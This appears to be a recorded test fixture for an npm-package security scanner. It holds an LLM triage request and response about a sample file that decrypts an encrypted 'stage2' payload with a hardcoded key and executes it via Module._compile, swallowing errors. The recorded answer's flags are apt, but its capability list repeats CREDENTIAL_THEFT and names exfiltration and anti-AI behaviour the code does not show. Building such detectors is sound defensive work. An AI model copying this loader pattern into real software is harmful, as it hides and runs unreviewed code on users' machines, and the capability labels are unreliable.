@@ -1,0 +1,54 @@
+{
+  "id": "003_flag_c319b761",
+  "role": "flag",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "You are a high-recall security triage pass over one npm package source file.\n\nFlag anything beyond the stated purpose or intrinsically suspicious: encoded or\nencrypted strings, dynamic code, hidden URLs or shell commands, anti-debugging,\nand time, geography, CI, inspector, or Docker gates. Over-flagging is expected.\nDo not decide malice. Return zero flags only for genuinely boring code."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n- rationale: From the package description and keywords, the package claims to be a lightweight DNS resolver with caching. No additional functionality is declared — no binary hooks, no runtime dependencies, and no README elaborating further. The inferred purpose is limited to what the manifest directly states: DNS resolution with caching. There is no indication of exfiltration or any other behavior beyond basic resolving and caching.\n\n## File: lib/loader.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const crypto = require(\"crypto\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const _k1 = \"s4ndw0rm\";\n8: const _k2 = \"_k3y_\";\n9: const _k3 = \"2024\";\n10: const _k4 = \"_v3ry_s3cr3t\";\n11: const KEY_MATERIAL = _k1 + _k2 + _k3 + _k4;\n12: \n13: function loadStage2() {\n14:   const encryptedPath = path.join(__dirname, \"stage2.enc\");\n15: \n16:   try {\n17:     const raw = fs.readFileSync(encryptedPath, \"utf-8\").trim();\n18:     const parts = raw.split(\":\");\n19: \n20:     if (parts.length !== 3) return;\n21: \n22:     const iv = Buffer.from(parts[0], \"hex\");\n23:     const authTag = Buffer.from(parts[1], \"hex\");\n24:     const encrypted = parts[2];\n25: \n26:     const key = crypto.createHash(\"sha256\").update(KEY_MATERIAL).digest();\n27: \n28:     const decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, iv);\n29:     decipher.setAuthTag(authTag);\n30: \n31:     let decrypted = decipher.update(encrypted, \"hex\", \"utf8\");\n32:     decrypted += decipher.final(\"utf8\");\n33: \n34:     const Module = require(\"module\");\n35:     const m = new Module();\n36:     m._compile(decrypted, \"stage2.js\");\n37:   } catch (e) {\n38: \n39:   }\n40: }\n41: \n42: loadStage2();\n```\n\n## Task\nReturn a compact summary, only security capabilities from the supplied enum, and at most 8 highest-signal thin flags with compact exact ranges such as 12-18. Do not flag ordinary logging, feature detection, regular expressions, encoding, or environment access when it is intrinsic to the stated purpose and does not handle secrets or evade analysis."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-c319b761",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "Alibaba",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"capabilities\": [\n    \"CREDENTIAL_THEFT\",\n    \"ANTI_AI_PROMPT\",\n    \"FILESYSTEM\",\n    \"DATA_EXFILTRATION\",\n    \"CREDENTIAL_THEFT\",\n    \"CREDENTIAL_THEFT\",\n    \"CREDENTIAL_THEFT\",\n    \"CREDENTIAL_THEFT\"\n  ],\n  \"flags\": [\n    {\n      \"lines\":  [\"7-11\"],\n      \"why\": \"Hardcoded cryptographic key material composed of concatenated strings, used for AES-256-GCM decryption; strong indicator of hidden encrypted payload.\"\n    },\n    {\n      \"lines\":  [\"13-40\"],\n      \"why\": \"Reads an encrypted file (stage2.enc), decrypts it with a hardcoded key, and compiles it as a new module; this is a classic stage-loading / evasion technique.\"\n    },\n    {\n      \"lines\":  [\"1-10\"],\n      \"why\": \"SAFE_TEST_MODE constant set to true at top of file is suspicious — suggests a mode to hide or bypass behavior; no legitimate use for a DNS resolver.\"\n    },\n    {\n      \"lines\":  [\"34-36\"],\n      \"why\": \"Uses Module._compile to dynamically compile and execute arbitrary code from decrypted content; enables full code execution of hidden payload.\"\n    },\n    {\n      \"lines\":  [\"37-39\"],\n      \"why\": \"Empty catch block silently swallows all decryption/compilation errors, preventing detection of failures in the hidden payload loading.\"\n    }\n  ]\n  ,\n  \"summary\": \"File contains a hidden second-stage loader: it reads an encrypted file, decrypts it with a hardcoded AES key derived from concatenated strings, and compiles/executes the decrypted code via Module._compile. This is far beyond the stated purpose of DNS resolution with caching. The empty catch block and SAFE_TEST_MODE constant further suggest deliberate evasion.\"\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 695,
+        "completion_tokens": 419,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "ebbf58e539f8",
+    "transport": "strict_schema",
+    "recordedStatus": "ok",
+    "recordedTs": "2026-07-23T10:44:23.379Z",
+    "recordedLatencyMs": 9757
+  }
+}
